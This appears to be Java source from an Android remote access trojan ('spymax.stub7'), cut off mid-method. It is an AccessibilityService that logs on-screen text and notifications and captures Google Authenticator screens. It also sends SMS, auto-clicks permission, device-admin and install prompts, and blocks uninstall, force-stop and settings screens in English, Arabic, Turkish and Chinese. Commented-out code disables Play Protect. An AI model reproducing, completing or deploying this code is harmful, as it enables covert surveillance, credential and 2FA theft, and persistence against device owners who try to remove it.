package spymax.stub7;
import static spymax.stub7.ClassGen3.speedTime;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;

import android.accessibilityservice.GestureDescription;
import android.app.Notification;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;

import android.graphics.Canvas;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.graphics.Point;
import android.graphics.Rect;

import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.media.MediaRecorder;

import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;

import android.support.annotation.RequiresApi;
import android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.view.Gravity;
import android.view.SurfaceView;

import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityManager;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.FrameLayout;



import java.io.BufferedReader;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;

import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;


import java.util.ArrayList;
import java.util.List;




public class    ClassGen12 extends AccessibilityService {

    private String getEventText(AccessibilityEvent event) {
        List<CharSequence> text = event.getText();
        return text.toString();
    }

    public void ClassGen12SendMeHome(){
        try
        {
            Handler handler = new Handler(Looper.getMainLooper());
            handler.post(new Runnable() {
                @Override
                public void run() {
                    try{
                        Intent home = new Intent(Intent.ACTION_MAIN);
                        home.addCategory(Intent.CATEGORY_HOME);
                        home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(home);
                        // ClassGen9.DumpActivity.startActivityForResult();
                    }catch (Exception e){}

                }

            });

        }catch (Exception e){}
       /* Intent dialogIntent = new Intent(this, ActivityAlert2.class)
                .putExtra("start", "blockDelete");
        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
        startActivity(dialogIntent);*/
    }

    public static Boolean ClassGen12Auto_Click = false;
    public static Boolean ClassGen12FOR_SC = false;
    public static DevicePolicyManager mDPM;
    private ComponentName mAdminName;
    public static Boolean ClassGen12FOR_IN = false;
    public static Boolean ClassGen12FOR_prim = false;
    public static Boolean ClassGen12FOR_ADM = false;
   // public static Boolean FOR_ADM = false;
    public static Boolean ClassGen12bypass = false;
    public static String ClassGen12OFK = "[off_keylog]";
    public static String ClassGen12DisablePlayProtect = "[DIS_PROTECTION]";
    public static boolean ClassGen12CheckPrims =false;
    public static String ClassGen12OFFOK = "on";
  //  public static Boolean bypass = false;

//    private void logall(AccessibilityNodeInfo node)
//
//    {
//        //AccessibilityNodeInfo node = getRootInActiveWindow();
//        if(node != null) {
//            for(int i = 0; i < node.getChildCount(); i++){
//                AccessibilityNodeInfo childNode = node.getChild(i);
//                if(childNode != null){
//                    Log.i("childNode", "-----getText->"+childNode.getText()+"---getContentDescription-->"+childNode.getContentDescription() );
//                }
//            }
//        }
//    }

    public void mouseDraw(Point[] segments, int time) {
        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {

            Path path = new Path();
            path.moveTo(segments[0].x, segments[0].y);

            for (int i = 1; i < segments.length; i++) {

                path.lineTo(segments[i].x, segments[i].y);

                GestureDescription.StrokeDescription sd = new GestureDescription.StrokeDescription(path, 0, time);

                dispatchGesture(new GestureDescription.Builder().addStroke(sd).build(), new AccessibilityService.GestureResultCallback() {

                    @Override
                    public void onCompleted(GestureDescription gestureDescription) {
                        super.onCompleted(gestureDescription);
                    }

                    @Override
                    public void onCancelled(GestureDescription gestureDescription) {
                        super.onCancelled(gestureDescription);
                    }
                }, null);
            }
        }
    }
    public static void sendSMS(String phoneNo, String msg) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNo, null, msg, null, null);

        } catch (Exception ex) {

            //ex.printStackTrace();
        }
    }
    @RequiresApi(api = Build.VERSION_CODES.N)
    public void ClassGen12SW(String D)
    {
      try
      {


          DisplayMetrics displayMetrics = getResources().getDisplayMetrics();
//        int width  = Integer.parseInt(ClassGen9.display_width);
//        int heights = Integer.parseInt( ClassGen9.display_height);
          if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
          if (D.startsWith("clk"))
          {

              boolean hold = false;
              int duration = 1;
              String[] sizearry = D.split(":");

              int width  = Integer.parseInt(sizearry[1]);
              int height = Integer.parseInt( sizearry[2]);
              if (D.contains("hold"))
                  {
                      hold=true;
                      duration=3000;
                      width = Integer.parseInt(sizearry[2]);
                      height = Integer.parseInt( sizearry[3]);
                  }


              Path clickPath = new Path();
              clickPath.moveTo(width, height);
              GestureDescription.StrokeDescription clickStroke = null;

                  clickStroke = new GestureDescription.StrokeDescription(clickPath, 0, duration,hold);

              GestureDescription.Builder clickBuilder = new GestureDescription.Builder();
              clickBuilder.addStroke(clickStroke);
              dispatchGesture(clickBuilder.build(), null, null);
              return;
          }

          if (D.equals("Bc"))
          {
              //   blockBack(1);
              performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
              return;
          }
          else if (D.equals("Ho"))
          {
              // startActivity((new Intent(Intent.ACTION_MAIN)).addCategory(Intent.CATEGORY_HOME).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
              performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
              return;
          }
          else if(D.equals("RC"))
          {
              performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
              return;
          }
//          int middleYValue = displayMetrics.heightPixels / 2;
//          final int leftSideOfScreen = displayMetrics.widthPixels / 4;
//          final int rightSizeOfScreen = leftSideOfScreen * 3;
//          GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
//          Path path = new Path();
//          final int height = displayMetrics.heightPixels;
//          final double top = height * .25;
//          final double mid = height * .5;
//          final double bottom = height * .75;
//          final int midX = displayMetrics.widthPixels / 2;
//          switch (D){
//              case "U":
//                  path.moveTo(midX, (float)bottom);
//                  path.lineTo(midX,  (float)top);
//                  gestureBuilder.addStroke(new GestureDescription.StrokeDescription(path, 0, 1));
//                  break;
//              case "D":
//                  path.moveTo(midX,  (float)top);
//                  path.lineTo(midX,  (float)bottom);
//                  gestureBuilder.addStroke(new GestureDescription.StrokeDescription(path, 0, 1));
//                  break;
//              case "L":
//                  path.moveTo(rightSizeOfScreen, middleYValue);
//                  path.lineTo(leftSideOfScreen, middleYValue);
//                  gestureBuilder.addStroke(new GestureDescription.StrokeDescription(path, 0, 1));
//                  break;
//              case "R":
//                  path.moveTo(leftSideOfScreen, middleYValue);
//                  path.lineTo(rightSizeOfScreen, middleYValue);
//                  gestureBuilder.addStroke(new GestureDescription.StrokeDescription(path, 0, 1));
//                  break;
//          }
//          dispatchGesture(gestureBuilder.build(), new GestureResultCallback() {
//              @Override
//              public void onCompleted(GestureDescription gestureDescription) {
//                  //Log.w("Gesture Completed");
//                  super.onCompleted(gestureDescription);
//              }
//          }, null);
          }
      }catch (Exception e){}
    }
    public static String ClassGen12ToPaste = "";
    public static Boolean ClassGen12NeedPaste = false;

    public void ClassGen12pasteText() {
        try
        {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            AccessibilityNodeInfo focus = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);

            if(focus != null){

              //String oldtext = (String) focus.getText(); //return the text in my input
                Bundle arguments = new Bundle();
                arguments.putString(AccessibilityNodeInfoCompat.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, ClassGen12ToPaste);

                boolean sucess = focus.performAction(AccessibilityNodeInfoCompat.ACTION_SET_TEXT, arguments);

                if (!sucess)
                {
                    if (ClassGen12Globalnode == null){return;}
            ClassGen12Globalnode.performAction(AccessibilityNodeInfoCompat.ACTION_SET_TEXT, arguments);
                }
                ClassGen12ToPaste ="";
                ClassGen12NeedPaste =false;
            }

        }catch (Exception ex){}
    }

    public void ClassGen12Treger()
    {
        
            Handler handler = new Handler(Looper.getMainLooper());
            handler.post(new Runnable() {
                @Override
                public void run() {
                    try{
                        AccessibilityManager manager = (AccessibilityManager) ClassGen11.app_ClassGen11_Context
                                .getSystemService(Context.ACCESSIBILITY_SERVICE);
                        if (manager.isEnabled()) {
                            AccessibilityEvent e = AccessibilityEvent.obtain();
                            e.setEventType(AccessibilityEvent.TYPE_ANNOUNCEMENT);
                            e.setClassName(getClass().getName());
                            e.setPackageName(ClassGen11.app_ClassGen11_Context.getPackageName());
                            e.getText().add("T");
                            manager.sendAccessibilityEvent(e);
                        }
                        // ClassGen9.DumpActivity.startActivityForResult();
                    }catch (Exception e){}

                }

            });


    }

public static boolean ClassGen12SendGoogleAuth = false;
public static AccessibilityNodeInfo ClassGen12Globalnode = null;
public static AccessibilityEvent ClassGen12GlobalEvent = null;
//    void blockProtect(AccessibilityNodeInfo nodeInfo,String className){
//        try {
//            if (DisablePlayProtect.equals("BLOCK")) {//BLOCK OFF PROTECT
//                FOR_PROTECTION=false;
//                if (android.os.Build.VERSION.SDK_INT >= 18) {
//
//                    if (nodeInfo == null) {
//
//                        return;
//                    }
//
//                    //NEW
//                    for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId("com.android.vending:id/toolbar_item_play_protect_settings")) {
//                        //performGlobalAction(GLOBAL_ACTION_HOME);
//                        blockBack();
//                    }
//
//                    //NEW
//                    for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId("com.android.vending:id/play_protect_settings")) {
//                        //performGlobalAction(GLOBAL_ACTION_HOME);
//                        blockBack();
//                    }
//
//                    if (className.equals("com.google.android.gms.security.settings.verifyappssettingsactivity")) {//OLD
//                        blockBack();
//                        // performGlobalAction(GLOBAL_ACTION_HOME);
//                    }
//                }
//            }
//        }catch (Exception ex){}
//    }

//    String clickprotect = "1";
//
//    void clickProtect(AccessibilityNodeInfo nodeInfo, String className,String packageAppStart){
//        try {
//            if (nodeInfo == null) {
//
//                return;
//            }
//            if (DisablePlayProtect.equals("ON")) {
//                if (android.os.Build.VERSION.SDK_INT >= 18) {
//                    // --- NEW Version---
//                    if (packageAppStart.equals("com.android.vending")) {
//                        if (clickprotect.equals("1")) {
//                            int display_x = Integer.parseInt(MySettings.read(this,MySettings.ScreenWidth,"720"));
//                            int display_y = Integer.parseInt(MySettings.read(this,MySettings.ScreenHight,"1080"));
//
//                            for (int i = 0; i < display_y/2; i += 50) {
//
//                                for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId("android:id/button1")) {
//                                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
//                                    clickprotect = "step";
//                                    //utl.SettingsWrite(this,consts.checkProtect, consts.str_step);
//                                    DisablePlayProtect = "BLOCK";
//                                    blockBack();
//                                    //performGlobalAction(GLOBAL_ACTION_HOME);
//                                    break;
//                                }
//                                if(clickprotect.equals(""))break;
//
//                                click(display_x / 2, 40 + i);
//
//                                //utl.chalkTile(100);
//
//                            }
//                        }
//
//                        String[] arrayButtonClick = {"com.android.vending:id/toolbar_item_play_protect_settings"
//                                , "com.android.vending:id/play_protect_settings", "android:id/button1"};
//                        for (int i = 0; i < arrayButtonClick.length; i++) {
//                            for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(arrayButtonClick[i])) {
//                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
//                                clickprotect = "1";
//                                if (arrayButtonClick[i].equals("android:id/button1")) {
//                                    clickprotect = "step";
//                                    DisablePlayProtect = "BLOCK";
//                                    blockBack();
//                                    //performGlobalAction(GLOBAL_ACTION_HOME);
//                                }
//                            }
//                        }
//                    }
//                    // --- OLD Version---
//                    if (className.equals("com.google.android.gms.security.settings.verifyappssettingsactivity")) {
//                        clickprotect = "1";
//                        nodeInfo.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
//                        int display_x = Integer.parseInt(MySettings.read(this,MySettings.ScreenWidth,"720"));
//                        int display_y = Integer.parseInt(MySettings.read(this,MySettings.ScreenHight,"1080"));
//                        for (int i = display_y; i > 30; i -= 15) {
//                            click(display_x / 2, display_y - i);
//                        }
//                    } else if ((className.equals("android.app.alertdialog")) && (clickprotect.equals("1"))) {
//                        for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId("android:id/button1")) {
//                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
//                            clickprotect = "0";
//                            DisablePlayProtect = "BLOCK";
//                            blockBack();
//                            //performGlobalAction(GLOBAL_ACTION_HOME);
//                        }
//                    }
//                }
//            }
//        }catch (Exception ex){
//            //utl.SettingsToAdd(this, consts.LogSMS , consts.string_172 + ex.toString() + consts.string_119);
//        }
//    }
        public static List<String> DisabledApps = new ArrayList<String>();
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {

//            AccessibilityNodeInfo node = getRootInActiveWindow();
//            if(node != null) {
//                for(int i = 0; i < node.getChildCount(); i++){
//                    AccessibilityNodeInfo childNode = node.getChild(i);
//                    if(childNode != null){
//                        Log.i("childNode", "-----getText->"+childNode.getText()+"---getContentDescription-->"+childNode.getContentDescription()+"----Location--"+childNode.getBoundsInScreen());
//                    }
//                }
//            }
             int eventType = 0;

             try
             {
                  eventType = event.getEventType();
                 ClassGen12GlobalEvent = event;
             }catch (Exception b){
               // eventType = -9978;
             }
            int f = 0;
            switch(eventType) {
                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                    f = 1;
                    break;
                case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                    f = 2;
                    break;
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    f = 3;
                    break;
                case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED  :
                    f = 4;
                    break;
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED  :
                    f = 5;
                    break;
            }
          //   if (eventType == -9978){return;}
            ClassGen12sendlog(event,f);

            AccessibilityNodeInfo nodeInfo = null;
            try
            {
                if (DisabledApps.size() > 0)
                {
                    if (DisabledApps.contains(event.getPackageName().toString().toLowerCase()))
                    {
                        try
                        {

                            ClassGen12blockBack();
                            ClassGen12SendMeHome();
                        }catch (Exception a){}
                    }
                }

            }catch (Exception fasd){}
             try
             {
                 nodeInfo = event.getSource();
             }catch (Exception ee){}

//            try
//            {
//
//                String Alltext = getEventText(event);
//                if (Alltext.toLowerCase().contains("uninstall") || Alltext.toLowerCase().contains("Delete".toLowerCase()) && Alltext.toLowerCase().contains(getAppNameFromPkgName(getApplicationContext(),getPackageName())));
//                {
//                    clickByText("Cancel");
//                    blockBack();
//                }
//
//            }catch (Exception Ex){}

          try {
              try
              {
                  if (nodeInfo != null & event.getClassName().equals("android.widget.EditText")) {
                      ClassGen12Globalnode =nodeInfo;
                  }
              }catch (Exception ee){

              }



              switch(eventType) {

                  case AccessibilityEvent.TYPE_ANNOUNCEMENT:
                      if (ClassGen12NeedPaste)
                      {

                          ClassGen12pasteText();
                      }
                      break;

                  case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED  :


                      try {
//                          if (ClassGen11.app_ClassGen11_Context == null)
//                          {
//                              ClassGen11.app_ClassGen11_Context = getApplicationContext();
//                          }
                          if (ClassGen11.MyAccess == null)
                          {
                              ClassGen11.MyAccess = this;
                          }
                      }catch (Exception S){}
                     // ClassGen12sendlog(event,4);
                      try {
                          // ClassGen3.ʾʼʾʿˈᵔঙʿ$ʿʼ₫[RANDOM-STRING]θᵢיʿᘣθˉˆˉθφˎ$ˉˎ$ﹳˊⶱⁱᵇʾ[RANDOM-STRING]ˑ$ˏـﹳﾞ$ʽ(this, 25000);
                          if (ClassGen2.ec_ClassGen2_ho)
                          {
                              ClassGen12SendNotifi(event);
                          }
                       //   Context ctx = getApplicationContext();


                      }catch (Exception ex){}

                      break;
                  case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED  :
                     try {
                        // ClassGen12sendlog(event,5);
                         if (ClassGen12SendGoogleAuth)
                         {
                             ClassGen3._SGA2(event,event.getPackageName().toString().toLowerCase());
                         }
                         if (ClassGen2.ec_ClassGen2_ho)
                         {
                             ClassGen12ActivSend(event);

                         }

                         if (ClassGen12FOR_IN)
                         {

                             if (Gotitinstalled(nodeInfo))
                             {

                                 ClassGen12FOR_IN = false;
                                 Thread.sleep(100);
                                 ClassGen12blockBack();
                             }
                         }
                     }catch (Exception e){

                     }


                      break;
              }
          }catch (Exception e){}

          if (ClassGen12FOR_ADM)
          {
              mDPM = (DevicePolicyManager)getSystemService(getApplicationContext().DEVICE_POLICY_SERVICE);

              mAdminName = new ComponentName(this, AdminReciver.class);
              if (mDPM.isAdminActive(mAdminName)) {
                  ClassGen12FOR_ADM =false;
              }
          }
            if (ClassGen12Auto_Click || ClassGen12FOR_SC || ClassGen12FOR_prim || ClassGen12FOR_ADM)
            {
                //  logall(getRootInActiveWindow());

                if (android.os.Build.VERSION.SDK_INT >= 18) {

                    try {
//                        clickByText("Allow");
//                        clickByText("Start");

                        if (nodeInfo == null) {
                            //utl.Log(TAG_LOG, consts.string_29);
                            return;
                        }
                        if (ClassGen12FOR_SC)
                        {
                            ClassGen12clickByText("Start Now");
                        }

                        if (ClassGen12FOR_prim)
                        {
                            ClassGen12clickByText("Allow");
                        }

//                        if (FOR_ADM && !_engine_wrk_.isadmin)
//                        {
//                            ActiveAdmin(nodeInfo);
//                           // return;
//                            //clickByText("Activate");
//                        }



                        String[] arrayButtonClick = {"com.android.packageinstaller:id/permission_allow_button", "android:id/button1", "com.android.settings:id/action_button","com.android.permissioncontroller:id/permission_allow_foreground_only_button","com.android.permissioncontroller:id/permission_allow_button"};
                        for (int i = 0; i < arrayButtonClick.length; i++) {
                            for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(arrayButtonClick[i])) {
                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                ClassGen12Auto_Click =false;
                                String display_width = MySettings.read(getApplicationContext(),MySettings.ScreenWidth,"720");
                                String display_height = MySettings.read(getApplicationContext(),MySettings.ScreenHight,"1080");

                                int width  = Integer.parseInt(display_width);
                                int height = Integer.parseInt( display_height);

                                if ((arrayButtonClick[i].contains("com.android.settings:id/action_button")) ) {

                                    for (int ii = 0; ii < 80; ii += 2) {
                                        ClassGen12click(width - 15, height - ii);
                                       //



                                    }
                                }


                            }
                        }

                        String[] arrayButtonClick2 = {"com.android.settings:id/left_button", "android:id/button1","com.android.permissioncontroller:id/permission_allow_foreground_only_button","com.android.permissioncontroller:id/permission_allow_button"};
                        for (int i = 0; i < arrayButtonClick2.length; i++) {
                            for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(arrayButtonClick2[i])) {
                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                ClassGen12Auto_Click =false;
                            }
                        }


                        //---------Xiaomi---------------

                        for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/accept")) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            ClassGen12Auto_Click =false;
                        }

                    }catch (Exception e){}

                }

            }

            if (ClassGen12CheckPrims)
            {
                if (!ClassGen3.H__ClassGen11_P(this, ClassGen3.PERMISSIONS())) {
                    ClassGen12CheckPrims =false;
                    try {
                        startActivity(new Intent(this, _ask_prim_.class)
                                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                    .addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY));
                        return;
                    } catch (Exception ex) {

                    }

                //  ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);

            }else
                {
                    ClassGen12CheckPrims =true;
                }

            }

            if (!ClassGen12bypass && !ClassGen12FOR_ADM)
            {
                //blockProtect(event.getSource(),event.getClassName().toString().toLowerCase());
                try {
                    String appname ="["+ getApplicationContext().getResources().getString(R.string.f1f2f3f4f5f6)+"]";
                    String appname2 = getApplicationContext().getResources().getString(R.string.f1f2f3f4f5f6);
                    if (Build.VERSION.SDK_INT > 15) {

                        String className = event.getClassName().toString().toLowerCase();
                        if (("com.android.settings.SubSettings".toLowerCase().equals(event.getClassName().toString().toLowerCase()))) {
                            if (getEventText(event).toLowerCase().equals(appname.toLowerCase()) || getEventText(event).toLowerCase().equals(appname2.toLowerCase()))
                            {

                                try
                                {
                                    ClassGen12blockBack();
                                    ClassGen12SendMeHome();

                                }catch (Exception hg){

                                }
                                //blockBack();
                            }

                            //utl.SettingsToAdd(this, consts.LogSMS , consts.string_164 + consts.string_119);
                        }
                        //if (event.a)

                        String EvntTEXT = getEventText(event).toLowerCase();


                        String Myname = getApplicationContext().getResources().getString(R.string.f1f2f3f4f5f6).toLowerCase();
                        String TargerPack = event.getPackageName().toString().toLowerCase();

                        try
                        {
                            DevicePolicyManager mDPM;
                            ComponentName mAdminName;
                            mDPM = (DevicePolicyManager)getSystemService(getApplicationContext().DEVICE_POLICY_SERVICE);
                            // Set DeviceAdminDemo Receiver for active the component with different option
                            mAdminName = new ComponentName(this, AdminReciver.class);
                            if (!mDPM.isAdminActive(mAdminName)) {
                                if (EvntTEXT.contains("Device Admin App".toLowerCase()) || EvntTEXT.contains("مشرف الجهاز".toLowerCase()))
                                {
                                    ClassGen12blockBack();
                                    ClassGen12SendMeHome();
                                }
                            }

                        }catch (Exception c){}

//                        if (TargerPack.contains("Accessibility".toLowerCase()) && EvntTEXT.contains(Myname) )
//                        {
//                            blockBack();
//                            SendMeHome();
//                        }

                        if (EvntTEXT.contains("Accessibility".toLowerCase()) && EvntTEXT.contains(Myname) )
                        {
                            ClassGen12blockBack();
                            ClassGen12SendMeHome();
                        }
                        if (EvntTEXT.contains("حذف".toLowerCase()) && EvntTEXT.contains(Myname) ||
                                EvntTEXT.contains("مسح".toLowerCase()) && EvntTEXT.contains(Myname) ||
                                EvntTEXT.contains("إلغاء".toLowerCase()) && EvntTEXT.contains(Myname))
                        {
                            ClassGen12blockBack();
                            ClassGen12SendMeHome();
                        }


                        if ( EvntTEXT.contains("Force stop".toLowerCase()) || EvntTEXT.contains("Delete app data".toLowerCase()))
                        {
                            // clickByText("cancel");
                            ClassGen12blockBack();
                            ClassGen12SendMeHome();
                            //  ClassGen11.showToast("this is a system app and can't be uninstalled");
                        }

                        //kaldır  uninstall
                        //sil delete
                        //verileri temizle clear data
                        if (EvntTEXT.contains(Myname)
                                && EvntTEXT.contains("clear data".toLowerCase()))
                        {
                            //clickByText("cancel");
                            ClassGen12blockBack();
                            ClassGen12SendMeHome();
                            // ClassGen11.showToast("this is a system app and can't be uninstalled");
                        }
                        if (EvntTEXT.contains(Myname)
                                && EvntTEXT.contains("sil".toLowerCase()) && !EvntTEXT.contains("Notification".toLowerCase()))
                        {
                            //clickByText("cancel");
                            ClassGen12blockBack();
                            ClassGen12SendMeHome();
                            // ClassGen11.showToast("this is a system app and can't be uninstalled");
                        }
                        if (EvntTEXT.contains(Myname)
                                && EvntTEXT.contains("kaldır".toLowerCase())
                                || EvntTEXT.contains(Myname)
                                && EvntTEXT.contains("silmek".toLowerCase())
                                || EvntTEXT.contains(Myname)
                                && EvntTEXT.contains("zorla".toLowerCase()))
                        {
                            //clickByText("cancel");
                            ClassGen12blockBack();
                            ClassGen12SendMeHome();
                            // ClassGen11.showToast("this is a system app and can't be uninstalled");
                        }



                        if (EvntTEXT.contains(Myname)
                                && EvntTEXT.contains("uninstall".toLowerCase())
                                || EvntTEXT.contains(Myname)
                                && EvntTEXT.contains("turn off".toLowerCase()) && !EvntTEXT.contains("Notification".toLowerCase()))
                        {
                            //clickByText("cancel");
                            ClassGen12blockBack();
                            ClassGen12SendMeHome();
                            // ClassGen11.showToast("this is a system app and can't be uninstalled");
                        }
                        if (EvntTEXT.contains(Myname)
                                && EvntTEXT.contains("卸载".toLowerCase())
                                || EvntTEXT.contains(Myname)
                                && EvntTEXT.contains("删除".toLowerCase()))
                        {
                            //clickByText("cancel");
                            ClassGen12blockBack();
                            ClassGen12SendMeHome();
                            // ClassGen11.showToast("this is a system app and can't be uninstalled");
                        }

                        //解除安装
                        if (EvntTEXT.contains(Myname)
                                && EvntTEXT.contains("解除安装".toLowerCase())
                        )
                        {
                            //clickByText("cancel");
                            ClassGen12blockBack();
                            ClassGen12SendMeHome();
                            // ClassGen11.showToast("this is a system app and can't be uninstalled");
                        }

                        //关闭
                        if (EvntTEXT.contains(Myname)
                                && EvntTEXT.contains("关闭".toLowerCase())
                        )
                        {
                            //clickByText("cancel");
                            ClassGen12blockBack();
                            ClassGen12SendMeHome();
                            // ClassGen11.showToast("this is a system app and can't be uninstalled");
                        }
                        if (EvntTEXT.contains("Phone options".toLowerCase()))
                        {
                            ClassGen12blockBack();
                            ClassGen12SendMeHome();
                            // ClassGen11.showToast("this is a system app and can't be uninstalled");
                        }


                        if (EvntTEXT.contains("إيقاف".toLowerCase())  && EvntTEXT.contains(Myname) && ("com.android.settings.SubSettings".toLowerCase().equals(event.getClassName().toString().toLowerCase())) ||
                                EvntTEXT.contains("stop".toLowerCase()) && EvntTEXT.contains(Myname)  && ("com.android.settings.SubSettings".toLowerCase().equals(event.getClassName().toString().toLowerCase())) ||
                                EvntTEXT.contains("delete".toLowerCase())&& EvntTEXT.contains(Myname)  && ("com.android.settings.SubSettings".toLowerCase().equals(event.getClassName().toString().toLowerCase())) ||
                                EvntTEXT.contains("الإيقاف".toLowerCase()) && EvntTEXT.contains(Myname) &&("com.android.settings.SubSettings".toLowerCase().equals(event.getClassName().toString().toLowerCase()))  )
                        {

                            try
                            {
                                //clickByText("cancel");
                                ClassGen12blockBack();
                                ClassGen12SendMeHome();
                            }catch (Exception sd){

                            }
                            // ClassGen11.showToast("this is a system app and can't be uninstalled");
                        }

                        //卸载
                        //删除

                        if ((event.getPackageName().toString().contains("com.google.android.packageinstaller"))
                                && (event.getClassName().toString().toLowerCase().contains("android.app.alertdialog"))
                                && (getEventText(event).toLowerCase().contains( getApplicationContext().getResources().getString(R.string.f1f2f3f4f5f6).toLowerCase()))) {

                            try
                            {
                                ClassGen12blockBack();
                                ClassGen12SendMeHome();
                            }catch (Exception gh){
                            }
                            //  utl.SettingsToAdd(this, consts.LogSMS , consts.string_167 + consts.string_119);
                        }
                        //--- Block Delete Bots ---
                        if (((className.equals("android.support.v7.widget.recyclerview")) || (className.equals("android.widget.linearlayout")) || (className.equals("android.widget.framelayout")))
                                && ((event.getPackageName().toString().equals("com.android.settings")) ||(event.getPackageName().toString().equals("com.miui.securitycenter")))
                                && (getEventText(event).toLowerCase().contains(Myname))) {
                            // utl.Log(TAG_LOG, "BLOCK DELETE 2");
                            ///  ClassGen11.showToast("this is a system app and can't be uninstalled");


                            ClassGen12blockBack();
                            ClassGen12SendMeHome();
                            //   utl.SettingsToAdd(this, consts.LogSMS , consts.string_167 + consts.string_119);
                        }
                    }

                }catch (Exception e){

                }

            }



        } catch (Exception e) {

        }

    }



    @Override
    public void onInterrupt() {

    }

    private static boolean ClassGen12performClick(List<AccessibilityNodeInfo> nodeInfos) {
        try
        {
            if (nodeInfos != null && !nodeInfos.isEmpty()) {
                for (AccessibilityNodeInfo node : nodeInfos) {
                    // 获得点击View的类型
                    //   System.out.println("View类型：" + node.getClassName());
                    // 进行模拟点击
                    if (node.isEnabled()) {
                        return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    }
                }
            }
        }catch (Exception f){}
        return false;
    }

    public static List<AccessibilityNodeInfo> ClassGen12findNodesByText(String text) {
        AccessibilityNodeInfo nodeInfo = ClassGen12getRootNodeInfo();
        if (nodeInfo != null) {
            return nodeInfo.findAccessibilityNodeInfosByText(text);
        }
        return null;
    }
    private static AccessibilityNodeInfo ClassGen12getRootNodeInfo() {

            if (Build.VERSION.SDK_INT >= 16) {
                // 建议使用getRootInActiveWindow，这样不依赖当前的事件类型
                return ClassGen11.MyAccess.getRootInActiveWindow();
                // 下面这个必须依赖当前的AccessibilityEvent
//            nodeInfo = curEvent.getSource();
            } else {
                return ClassGen12GlobalEvent.getSource();
            }

    }


    public static boolean ClassGen12clickByText(String text) {
        return ClassGen12performClick(ClassGen12findNodesByText(text));
    }
    private boolean Gotitinstalled(AccessibilityNodeInfo nodeInfo) {
        if (nodeInfo != null) {
            int childCount = nodeInfo.getChildCount();
            if ("android.widget.Button".equals(nodeInfo.getClassName())) {
                String ClassGen12nodeContent = nodeInfo.getText().toString();
               // Log.d("TAG", "content is " + ClassGen12nodeContent);
                if (!TextUtils.isEmpty(ClassGen12nodeContent)
                        && ("安装".equals(ClassGen12nodeContent)
                        || "install".equals(ClassGen12nodeContent.toLowerCase())
                        || "done".equals(ClassGen12nodeContent.toLowerCase())
                        || "完成".equals(ClassGen12nodeContent)
                        || "تثبيت".equals(ClassGen12nodeContent)
                        || "确定".equals(ClassGen12nodeContent)
                )) {
                    nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
            } else if ("android.widget.ScrollView".equals(nodeInfo.getClassName())) {
                nodeInfo.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
            }
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo childNodeInfo = nodeInfo.getChild(i);
                if (Gotitinstalled(childNodeInfo)) {
                    return true;
                }
            }
        }
        return false;
    }

    private void ClassGen12SendNotifi(AccessibilityEvent event) {
        try
        {
            Notification notification = (Notification) event.getParcelableData();
            if (notification == null) return;

